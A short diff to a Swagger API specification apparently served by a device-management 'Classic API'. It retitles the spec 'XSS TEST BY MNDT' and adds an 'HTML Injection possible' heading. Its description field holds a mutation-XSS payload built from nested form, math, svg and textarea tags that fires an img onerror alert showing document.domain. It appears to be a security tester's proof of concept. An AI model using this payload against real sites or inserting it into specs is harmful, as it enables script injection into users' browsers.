@@ -1,9 +1,9 @@
 swagger: '2.0'
 info:
-  title: Classic API Resource Documentation
+  title: XSS TEST BY MNDT
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
-
+<H1> HTML Injection possible </H1>
   version: production
 basePath: /JSSResource/
 produces:
